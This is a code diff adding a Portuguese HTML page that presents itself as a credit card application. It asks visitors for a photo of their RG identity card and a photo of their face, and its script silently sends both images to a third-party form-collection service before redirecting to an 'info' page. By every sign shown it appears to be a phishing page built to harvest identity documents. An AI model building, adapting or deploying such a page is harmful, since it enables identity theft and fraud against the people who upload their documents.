@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Envio de Documentos</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+
+        /* Estilo da logo */
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 120px;
+            height: auto;
+        }
+
+        /* Barra de navegação de categorias */
+        .categories {
+            width: 100%;
+            max-width: 1000px;
+            background-color: #fff;
+            border-bottom: 2px solid #ccc;
+            display: flex;
+            justify-content: center;
+            padding: 10px 0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+        }
+
+        .categories a {
+            color: #007BFF;
+            text-decoration: none;
+            padding: 10px 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin: 0 10px;
+            transition: background-color 0.3s, color 0.3s;
+            font-weight: bold;
+        }
+
+        .categories a:hover {
+            background-color: #f1f1f1;
+        }
+
+        /* Estilo do container do formulário */
+        .form-container {
+            background-color: #fff;
+            padding: 30px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            width: 350px;
+            text-align: center;
+        }
+
+        .form-container label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .form-container input[type="file"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #ffeb3b; /* Borda amarela */
+            border-radius: 5px;
+            background-color: #f5f5f5;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .form-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .form-container button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Texto adicional */
+        .text-gray {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        /* Overlay de carregamento */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: #fff;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: bold;
+            z-index: 1000; /* Certifica-se de que o overlay fique acima de todos os outros elementos */
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Logo do site -->
+    <img src="imgs/logooficial.png" alt="Logo do Site" class="logo">
+
+    <!-- Seção de categorias no topo -->
+    <nav class="categories">
+        <a href="index.html">Página Inicial</a>
+        <a href="foto.html">Solicitar Cartão de Credito</a>
+        
+    </nav>
+
+    <!-- Container do formulário -->
+    <div class="form-container">
+        <!-- Texto explicativo -->
+        <div class="text-gray">
+            Para que sua solicitação seja aceita, é necessária a submissão de dois documentos:
+            <ul>
+                <li>Foto do RG</li>
+                <li>Foto do Rosto</li>
+            </ul>
+        </div>
+
+        <!-- Formulário de upload -->
+        <form id="uploadForm" action="https://usebasin.com/f/f3b6c32abfdd" method="POST" enctype="multipart/form-data" onsubmit="handleSubmit(event)">
+            <label for="rg">Foto do RG:</label>
+            <input type="file" id="rg" name="rg" accept="image/*" required>
+
+            <label for="face">Foto do Rosto:</label>
+            <input type="file" id="face" name="face" accept="image/*" required>
+
+            <!-- Botão de envio -->
+            <button type="submit">Enviar Documentos</button>
+        </form>
+    </div>
+
+    <!-- Overlay de carregamento -->
+    <div id="loadingOverlay" class="loading-overlay">Enviando, por favor aguarde...</div>
+
+    <script>
+        // Função para tratar o envio do formulário
+        function handleSubmit(event) {
+            event.preventDefault(); // Impede o envio padrão do formulário
+            const formData = new FormData(document.getElementById('uploadForm'));
+            const loadingOverlay = document.getElementById('loadingOverlay');
+
+            // Mostra o overlay de carregamento
+            loadingOverlay.style.display = 'flex';
+
+            // Realiza a submissão do formulário usando Fetch API
+            fetch(document.getElementById('uploadForm').action, {
+                method: 'POST',
+                body: formData
+            })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = 'info.html'; // Redireciona para a página info.html
+                    } else {
+                        console.error('Erro na submissão do formulário');
+                    }
+                    loadingOverlay.style.display = 'none'; // Esconde o overlay de carregamento
+                })
+                .catch(error => {
+                    console.error('Erro:', error);
+                    loadingOverlay.style.display = 'none'; // Esconde o overlay de carregamento
+                });
+        }
+    </script>
+</body>
+
+</html>
